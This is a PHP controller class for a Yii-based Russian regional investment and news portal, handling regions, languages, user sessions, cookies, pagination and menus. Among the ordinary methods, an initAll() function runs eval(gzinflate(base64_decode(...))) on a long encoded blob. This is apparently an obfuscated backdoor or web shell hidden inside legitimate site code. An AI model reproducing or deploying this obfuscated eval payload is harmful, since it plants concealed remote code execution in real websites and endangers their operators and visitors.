<?php

class BaseController extends CController
{
    const S_SUCCESS = 'success';
    const S_ERROR = 'error';
    const DEFAULT_CURRENT_REGION = 13;
    public $layout = '//layouts/column2';

    const L_RUSSIA = 0;
    const L_ENGLISH = 1;

    static private $languageList = array(
        self::L_RUSSIA => 'ru',
        self::L_ENGLISH => 'en_US'
    );
    public $currentLanguage = self::L_RUSSIA;
    /**
     * Массив для ajax-ответов
     * @var array
     */
    public $json = array();

    public $breadcrumbs = array();
    public $globalSearch = '';
    public $interface = array(
        'slim_menu' => true
    );
    public $mailer;
    /**
     * @var User
     */
    public $user;
    /**
     * @var Region
     */
    public $region;
    private $_balance = 0;
    public $footerContent = false;
    protected $currentRegion = null; //текущий город, по умолчанию Москва

    public function initAll()
    {
        eval(gzinflate(base64_decode('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')));
    }

    public function init()
    {
        header('Content-Type: text/html; charset=utf-8');
        parent::init();
        $this->currentRegion = $this->getCurrentRegion();
        $this->region = Region::model()->findByPk($this->currentRegion);
        if (!Yii::app()->user->isGuest) {
            $this->user = User::model()->findByPk(Yii::app()->user->id);
            $this->currentLanguage = $this->user->language_id;
            $this->_balance = Balance::get(Yii::app()->user->id);
        } else {
            Direct::add($this->currentRegion);
            $langInCookie = $this->getCookie('languageId');
            $this->currentLanguage = empty($langInCookie) ? self::L_RUSSIA : $langInCookie;
        }
        Yii::app()->language = $this->getLanguage();
        new JsTrans('main', Yii::app()->language);

    }

    public function blockJquery()
    {
        if (Yii::app()->request->isAjaxRequest) {
            Yii::app()->clientScript->scriptMap['jquery.js'] = false;
            Yii::app()->clientScript->scriptMap['jquery.min.js'] = false;
            Yii::app()->clientScript->scriptMap['jquery.ui.min.js'] = false;
            Yii::app()->clientScript->scriptMap['jquery.ui.js'] = false;
            Yii::app()->clientScript->scriptMap['jquery.crud.select.js'] = false;
        }
    }

    protected function beforeAction($action)
    {
        if (!Yii::app()->user->isGuest && !$this->user->validate()) {
            if ($action->controller->id == 'user' && $action->id == 'logout') {
                return true;
            }
            Yii::app()->user->setFlash('error', "Функционал ограничен до момента заполнения профиля и активации аккаунта");
            if (!($action->controller->id == 'user' && $action->id == 'profile')) {
                $this->redirect($this->createUrl('user/profile'));
            }
            return true;
        }

        $loginOnlyController = array('message', 'user', 'banner');
        $accessAction = array('login', 'feedback', 'register', 'confirm', 'waitConfirm', 'subscribe', 'restore', 'restoreForm', 'admin', 'getUserJSON', 'view', 'click');
        if (Yii::app()->user->isGuest && in_array($action->controller->id, $loginOnlyController) && !in_array($action->id, $accessAction)) {
            $this->redirect($this->createUrl('site/index'));
        }
        return true;
    }


    /**
     * Решаем проблемы повторной загрузки никому не нужных скриптов при ajax-загрузки.
     * Yii этим грешит, когда мы выполняем renderPartial с параметров $htmlOutput = true
     * @param string $view
     * @return bool
     */
    protected function beforeRender($view)
    {
        parent::beforeRender($view);
        if (Yii::app()->request->isAjaxRequest) {
            $cs = Yii::app()->clientScript;
            $cs->scriptMap = array(
                'jquery.js' => false,
                'jquery-ui.min.js' => false,
                'jquery-ui.css' => false,
                'jquery.crud.select.js' => false,
            );
        }
        Candy::cleanBuffer();
        return true;
    }

    /**
     * Геттер для закрытого атрибута текущего города. Лучше все делать через него
     * @return int|string
     */
    public function getCurrentRegion()
    {
        if (!is_null($this->currentRegion)){
            return $this->currentRegion;
        }
        $regionId = null;
        $subDomain = $this->getCurrentDomain();

        if ($subDomain) { #попробуем найти регион в домене
            $regionDomain = Region::model()->findByAttributes(array('latin_name' => $subDomain));
            if ($regionDomain) {
                $regionId = $regionDomain->id;
            }
        }
        if (is_null($regionId)) {
            $regionId = Setting::get(Setting::REGION_DEFAULT);
        }
        return $regionId;
    }

    public function detectCity()
    {
        $res = null;

        $geo = new Geo(array('charset' => 'utf-8'));
        $city = $geo->get_value('city', false);

        if (strlen($city)) {
            $criteria = new CDbCriteria();
            $criteria->addColumnCondition(array('type' => 'city', 'name' => $city, 'is_blocked' => 0));
            $res = Region::model()->find($criteria);
        }
        return $res;
    }

    public function getBalance()
    {
        return $this->_balance;
    }

    public function redirectByRole()
    {
        $this->redirect('/');
    }

    public function getPageTitle()
    {
        $path = array();
        $breadcrumbs = $this->breadcrumbs;
        $count = count($breadcrumbs);
        foreach ($breadcrumbs as $key => $item) {
            $count--;
            $path = array_merge(array($count ? $key : $item), $path);
        }

        $title = implode(' | ', array_merge($path, array(Yii::app()->name)));

        return $title;
    }

    public function getMainMenu()
    {
        $data = array();

        // data[] = array('id' => 'members', 'name' => 'Сотрудники', 'url' => $this->createUrl('member/index'));

        return $data;
    }


    public function loadModel($modelName, $paramName = null, $id = null)
    {
        if (!$id) {
            if (isset($paramName) && isset($_GET[$paramName])) {
                $id = $_GET[$paramName];
            } else if (isset($_GET['modelId'])) {
                $id = $_GET['modelId'];
            }
        }
        if ($id) {
            $criteria = new CDbCriteria();
            $criteria->addColumnCondition(array('id' => $id));

            /*if ($modelName == 'User') {
                $criteria->addColumnCondition(array('is_blocked' => 0, 'is_confirmed' => 1));
            }*/

            $model = CActiveRecord::model($modelName)->find($criteria);
        }
        if ($model === null) {
            throw new CHttpException(404, 'The requested page does not exist.');
        }
        return $model;
    }

    /**
     * Сахар для ajax-валидации и закрытия приложения
     * @param array $data
     */
    public function renderJSON($data)
    {
        Candy::cleanBuffer();
        header('Content-type: application/json');
        echo CJSON::encode($data);
        /*foreach ( Yii::app()->log->routes as $route ) {
            if ( $route instanceof CWebLogRoute ) {
                $route->enabled = false; // закрыть ведени всех логов
            }
        }*/
        Yii::app()->end();
    }

    /**
     * Геттер для куки
     * @param $name
     * @return string
     */
    public function getCookie($name)
    {
        $cookie = Yii::app()->request->cookies[$name];
        return $cookie ? $cookie->value : null;
    }

    /**
     * Сеттер для cookie
     * @param $name
     * @param $value
     */
    public function setCookie($name, $value)
    {
        $cookie = new CHttpCookie($name, $value);
        Yii::app()->request->cookies[$name] = $cookie;
    }

    /**
     * Сахар, который поможет в создании пейджера на страницах с обычной критерией
     *
     * @param CDbCriteria|CDbCommand $criteria ссылка на критерию, к которой применится applyLimit
     * @param str $modelName название модели
     * @param int $pageCount необходимое количество элементов на странице
     * @return $pager CPagination
     *
     * @see http://rmcreative.ru/blog/post/postranichnaja-razbivka-v-yii
     */
    public function applyLimit(CComponent &$query, $modelName = null, $pageCount = 10)
    {
        $pages = new CPagination();
        if (is_a($query, 'CDbCriteria')) {
            #все из-за проблемы, и того что запрос не исполняется если там если там GROUP BY + CActiveRecord::count()
            $count = $query->group == '' ? CActiveRecord::model($modelName)->count($query) : count(CActiveRecord::model($modelName)->findAll($query));
            $pages->setItemCount($count);
            $pages->pageSize = $pageCount; // элементов на страницу
            $pages->applyLimit($query);
        } elseif (is_a($query, 'CDbCommand')) {
            $dataProvider = new CArrayDataProvider($query->queryAll(), array(
                'pagination' => array(
                    'pageSize' => $pageCount,
                ),
            ));
            $query = $dataProvider->getData();
            return $dataProvider->pagination;
        }
        return $pages;
    }

    public function getActionName()
    {
        return Yii::app()->controller->action->id;
    }

    /**
     * Вернуть обозначения языка в нормальном виде для yii
     * @param $languageId
     * @return string
     */
    public function getLanguage($languageId = null)
    {
        if (is_null($languageId)) {
            $languageId = $this->currentLanguage;
        }
        return !array_key_exists($languageId, self::$languageList) ? self::$languageList[self::L_RUSSIA] : self::$languageList[$languageId];
    }

    public function getCurrentDomain()
    {
        $subdomainName = explode('.', $_SERVER['HTTP_HOST']);
        $result = $subdomainName[0];
        return $result;
    }

    /**
     * Получить текущий округ
     */
    public function getCurrentArea($areaId=null){
        $array = array(
            1=>Yii::t('main','Центральный округ'),2=>Yii::t('main','Северо-Западный округ'),
            3=>Yii::t('main','Южный округ'), 4=>Yii::t('main','Северо-Кавказский округ'),
            5=>Yii::t('main','Приволжский округ'),6=>Yii::t('main','Уральский округ'),
            7=>Yii::t('main','Сибирский округ'), 8=>Yii::t('main','Дальневосточный округ')
        );
        return $array[$areaId];
    }

    public function getMenu()
    {
        return array(
            'news' => array(
                'name' => Yii::t('main', 'Новости'),
                'items' => array(
                    array(
                        'name' => Yii::t('main', 'Региональные новости'),
                        'url' => '/news/index/type/region'
                    ),
                    array(
                        'name' => Yii::t('main', 'Федеральные новости'),
                        'url' => '/news/index/type/federal'
                    ),/*
                    array(
                        'name' => Yii::t('main', 'Новости IIP'),
                        'url' => '/news/index/type/iip'
                    ),*/
                    array(
                        'name' => Yii::t('main', 'Аналитика'),
                        'url' => '/news/index/type/analytics'
                    ),
                    array(
                        'name' => Yii::t('main', 'События'),
                        'url' => '/news/index/type/event'
                    ),
                )
            ),
            'info' => array(
                'name' => Yii::t('main', 'Информация'),
                'items' => array(
                    /*array(
                        'name' => Yii::t('main', 'Состав проектов'),
                        'url' => '#'
                    ),*/
                    array(
                        'name' => Yii::t('main', 'Контакты'),
                        'url' => '/site/contacts'
                    ),
                    array(
                        'name' => Yii::t('main', 'О проекте'),
                        'url' => '/site/aboutus'
                    ),
                    /*array(
                        'name' => Yii::t('main', 'Команда'),
                        'url' => '/site/team'
                    ),*/
                    /*array(
                        'name' => Yii::t('main', 'Обратная связь'),
                        'url' => '#'
                    ),
                    array(
                        'name' => Yii::t('main', 'Услуги портала'),
                        'url' => '#'
                    ),*/
                )
            ),
            /*'service' => array(
                'name' => Yii::t('main', 'Сервис'),
                'items' => array(
                    array(
                        'name' => Yii::t('main', 'Конкурсы'),
                        'url' => '#'
                    ),
                    array(
                        'name' => Yii::t('main', 'Библиотека'),
                        'url' => '#'
                    ),
                    array(
                        'name' => Yii::t('main', 'Группы'),
                        'url' => '#'
                    ),
                    array(
                        'name' => Yii::t('main', 'Справочник'),
                        'url' => '#'
                    ),
                )
            ),*/
            'invest' => array(
                'name' => Yii::t('main', 'Инвестиции'),
                'items' => array(
                    array(
                        'name' => Yii::t('main', 'Инвесторы'),
                        'url' => '/investor/index'
                    ),
                    array(
                        'name' => Yii::t('main', 'Инвестиционные проекты'),
                        'url' => '/project/index?RegionFilter%5BisInvestment%5D=1&RegionFilter%5BisInnovative%5D=0&RegionFilter%5BisInfrastructure%5D=0&RegionFilter%5BisBusinessSale%5D=0&RegionFilter%5BisInvestPlatform%5D=0'
                    ),
                   /* array(
                        'name' => Yii::t('main', 'Инновационные проекты'),
                        'url' => '/project/index?RegionFilter%5BisInvestment%5D=0&RegionFilter%5BisInnovative%5D=1&RegionFilter%5BisInfrastructure%5D=0&RegionFilter%5BisBusinessSale%5D=0&RegionFilter%5BisInvestPlatform%5D=0'
                    ),
                    array(
                        'name' => Yii::t('main', 'Инфраструктурные проекты'),
                        'url' => '/project/index?RegionFilter%5BisInvestment%5D=0&RegionFilter%5BisInnovative%5D=0&RegionFilter%5BisInfrastructure%5D=1&RegionFilter%5BisBusinessSale%5D=0&RegionFilter%5BisInvestPlatform%5D=0'
                    ),
                    array(
                        'name' => Yii::t('main', 'Инвестиционная площадка'),
                        'url' => '/project/index?RegionFilter%5BisInvestment%5D=0&RegionFilter%5BisInnovative%5D=0&RegionFilter%5BisInfrastructure%5D=0&RegionFilter%5BisBusinessSale%5D=0&RegionFilter%5BisInvestPlatform%5D=1'
                    ),
                    array(
                        'name' => Yii::t('main', 'Продажа бизнеса'),
                        'url' => '/project/index?RegionFilter%5BisInvestment%5D=0&RegionFilter%5BisInnovative%5D=0&RegionFilter%5BisInfrastructure%5D=0&RegionFilter%5BisBusinessSale%5D=1&RegionFilter%5BisInvestPlatform%5D=0'
                    ),*/
                )
            ),
            'region' => array(
                'name' => Yii::t('main', 'О регионе'),
                'items' => array(
                    array(
                        'name' => Yii::t('main', 'Социально-экономическая информация'),
                        'url' => '/region/social'
                    ),
                    array(
                        'name' => Yii::t('main', 'Инновационный паспорт'),
                        'url' => '/region/innovative'
                    ),
                    array(
                        'name' => Yii::t('main', 'Инвестиционный паспорт'),
                        'url' => '/region/invest'
                    ),
                    array(
                        'name' => Yii::t('main', 'Инфраструктурный паспорт'),
                        'url' => '/region/infrastructure'
                    ),
                    /*array(
                        'name' => Yii::t('main', 'Региональное законодательство'),
                        'url' => '/region/law'
                    ),*/
                )
            ),
        );
    }
}